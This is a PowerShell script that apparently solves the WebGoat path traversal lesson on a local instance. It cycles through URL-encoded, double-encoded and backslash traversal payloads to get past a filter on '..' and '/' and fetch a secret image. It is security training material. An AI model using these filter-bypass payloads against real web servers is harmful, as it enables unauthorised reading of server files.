# Path Traversal - File Retrieval Bypass
# Objective: Find path-traversal-secret.jpg using URL-encoded path traversal

param(
    [string]$SessionId = "31366EC6E3B179CBE65B1BCCC9B7B3CB"
)

Write-Host ""
Write-Host "=== Path Traversal - File Retrieval ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "Objective: Find path-traversal-secret.jpg" -ForegroundColor Yellow
Write-Host ""

$baseUrl = "http://localhost:8001/WebGoat/PathTraversal"

Write-Host "Step 1: Understanding the vulnerability" -ForegroundColor Cyan
Write-Host "  - Endpoint: /random (POST)" -ForegroundColor White
Write-Host "  - Normal behavior: id=10.jpg returns image from cats directory" -ForegroundColor White
Write-Host "  - Filter: '..' and '/' are blocked" -ForegroundColor White
Write-Host "  - Bypass: URL encode ../ " -ForegroundColor White
Write-Host ""

Write-Host "Step 2: Testing path traversal with URL encoding" -ForegroundColor Cyan
Write-Host ""

# Based on error: Files are in C:\Users\mahad\.webgoat-2025.3\PathTraversal\cats\
# Secret file is likely in: C:\Users\mahad\.webgoat-2025.3\PathTraversal\
# So we need ../ from cats directory
$searchPaths = @(
    @{desc="Parent + slash encoded"; path="..%2Fpath-traversal-secret.jpg"},
    @{desc="Parent dots encoded"; path="%2E%2E/path-traversal-secret.jpg"},
    @{desc="All encoded lowercase"; path="%2e%2e%2fpath-traversal-secret.jpg"},
    @{desc="All encoded uppercase"; path="%2E%2E%2Fpath-traversal-secret.jpg"},
    @{desc="Mixed encoding"; path="%2e%2e/path-traversal-secret.jpg"},
    @{desc="Without extension"; path="%2e%2e%2fpath-traversal-secret"},
    @{desc="With extension encoded"; path="%2e%2e%2fpath-traversal-secret%2ejpg"}
)

foreach($search in $searchPaths) {
    Write-Host "Trying: $($search.desc)" -ForegroundColor Yellow
    Write-Host "  Path: $($search.path)" -ForegroundColor Gray
    
    try {
        $url = "$baseUrl/random"
        
        # Make the POST request
        $response = curl.exe -s -X POST $url `
            -H "Cookie: JSESSIONID=$SessionId" `
            -H "Content-Type: application/x-www-form-urlencoded" `
            -H "X-Requested-With: XMLHttpRequest" `
            --data "id=$($search.path)" 2>$null | ConvertFrom-Json
        
        if ($response.lessonCompleted -eq $true) {
            Write-Host ""
            Write-Host "SUCCESS! Lesson completed!" -ForegroundColor Green
            Write-Host ""
            Write-Host "Feedback: $($response.feedback)" -ForegroundColor White
            Write-Host ""
            Write-Host "Exploit details:" -ForegroundColor Cyan
            Write-Host "  - File found: path-traversal-secret.jpg" -ForegroundColor White
            Write-Host "  - Location: $($search.desc)" -ForegroundColor White
            Write-Host "  - Payload: id=$($search.path)" -ForegroundColor White
            Write-Host "  - Bypass: URL-encoded characters" -ForegroundColor White
            Write-Host "  - Method: POST request to /random endpoint" -ForegroundColor White
            exit 0
        } else {
            Write-Host "  Result: $($response.feedback)" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "File not found in tested locations." -ForegroundColor Red
Write-Host ""
Write-Host "Additional attempts with variations:" -ForegroundColor Yellow

# Try more encoding variations
$encodingVariations = @(
    @{desc="Mixed case encoding"; path="%2E%2E%2Fpath-traversal-secret.jpg"},
    @{desc="Double encoding"; path="%252e%252e%252fpath-traversal-secret.jpg"},
    @{desc="Backslash variant"; path="..%5Cpath-traversal-secret.jpg"},
    @{desc="URL encoded backslash"; path="%2e%2e%5cpath-traversal-secret.jpg"}
)

foreach($variant in $encodingVariations) {
    Write-Host "Trying: $($variant.desc)" -ForegroundColor Yellow
    Write-Host "  Path: $($variant.path)" -ForegroundColor Gray
    
    try {
        $url = "$baseUrl/random-picture?id=$($variant.path)"
        $response = curl.exe -s -i -X GET $url `
            -H "Cookie: JSESSIONID=$SessionId" `
            -H "X-Requested-With: XMLHttpRequest" 2>$null
        
        $headers = ($response -split "`r`n`r`n")[0]
        
        if ($headers -match "Content-Type: image/jpeg") {
            Write-Host "  Result: Found image!" -ForegroundColor Green
            Write-Host ""
            Write-Host "SUCCESS! Secret file found!" -ForegroundColor Green
            Write-Host "Access URL: $url" -ForegroundColor White
            exit 0
        } else {
            Write-Host "  Result: Not found" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host "File not found with tested payloads." -ForegroundColor Red
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "1. The correct endpoint is POST to /WebGoat/PathTraversal/random" -ForegroundColor White
Write-Host "2. Parameter is 'id'" -ForegroundColor White  
Write-Host "3. The server appends .jpg to the id value" -ForegroundColor White
Write-Host "4. Use browser developer tools to manually test path variations" -ForegroundColor White
Write-Host "5. Try accessing random-picture via GET with different paths to see responses" -ForegroundColor White
Write-Host ""
Write-Host "Example test in browser console:" -ForegroundColor Cyan
Write-Host "fetch('/WebGoat/PathTraversal/random', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'id=..%2Fpath-traversal-secret'})" -ForegroundColor Gray
